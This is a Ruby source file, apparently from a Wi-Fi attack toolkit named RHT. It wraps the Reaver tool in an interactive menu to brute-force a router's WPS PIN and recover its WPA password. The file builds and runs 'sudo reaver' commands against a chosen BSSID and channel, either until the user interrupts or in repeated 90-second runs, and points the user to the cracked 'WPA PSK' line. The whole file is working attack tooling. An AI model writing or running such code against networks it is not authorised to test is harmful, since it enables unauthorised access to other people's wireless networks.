require 'timeout'
# 

def reaver_runner router = Router.new

	system("clear")
	puts "Reaver can be interrupted at any time."
	puts "It will save it's progress for the current router."
	puts "If you used Reaver on this router before you'll be"
	puts "asked if you want to load the progress."
	puts "\nIf Reaver succeeds you will see a 'WPA PSK: ...' line."
	puts "That's where the cracked password will be."
	puts
	puts "Do you prefer running Reaver until YOU interrupt it (Ctrl + C)\n"
	puts "or running it for 90 seconds then asking again?"
	puts "---------------------------------------"
	puts "1) Run Reaver until interruption"
	puts "2) Run Reaver for 90 seconds"
	puts "---------------------------------------"
	puts "Example: 1"
	puts "\nNote: You can type 'exit' if you want to "
	puts "exit RHT. Reaver saves its progress for the "
	puts "current router."
	puts
	printf "\n-> "
	input = gets.chomp
	
	begin
		case input
			when "1"
				system("sudo reaver -i mon0 -b #{router.bssid} -c #{router.channel} -f -vv -x 60")
				break
			
			when "2"
				pid = Process.spawn("sudo reaver -i mon0 -b #{router.bssid} -c #{router.channel} -f -vv -x 60")
				begin
					Timeout.timeout(90) do
						Process.wait(pid)
					end
				rescue Timeout::Error
					system("clear")
					Process.detach(pid)
					Process.kill(:TERM, pid)
				end
				
				puts
				puts "\nReaver ran 90 seconds. What to do next?"
				puts "---------------------------------------"
				puts "1) Run Reaver until interruption"
				puts "2) Run Reaver for 90 seconds"
				puts "---------------------------------------"
				puts "Example: 1"
				puts
				printf "\n-> "
				input = gets.chomp
		end
	
	end while input != "exit"
	
	puts
	puts "Reaver saved its progress (if there was such)."
	puts "Press Enter to continue..."
	gets.chomp


end

